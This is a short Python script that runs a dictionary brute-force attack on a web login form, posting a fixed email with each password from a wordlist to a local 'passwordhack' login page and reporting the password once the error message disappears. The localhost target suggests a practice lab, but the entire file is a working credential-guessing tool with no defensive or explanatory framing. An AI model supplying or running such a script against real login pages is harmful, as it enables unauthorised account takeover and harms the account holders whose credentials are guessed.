# pip install requests
import requests

url = "http://127.0.0.1/passwordhack/login.php"
email = "testuser@test.com"
password_list = "passwords.txt"

with open(password_list, "r") as file:
    for password in file:
        password = password.strip()
        response = requests.post(url, data={"email": email, "password": password})
        print(f"Trying: {password} | Response: {response.text}")
        
        # Check if the response does NOT contain "Invalid password"
        if "Invalid password" not in response.text:
            print(f"\033[92mPassword found: {password}\033[0m")
            break
        else:
            print(f"\033[91mPassword incorrect: {password}\033[0m")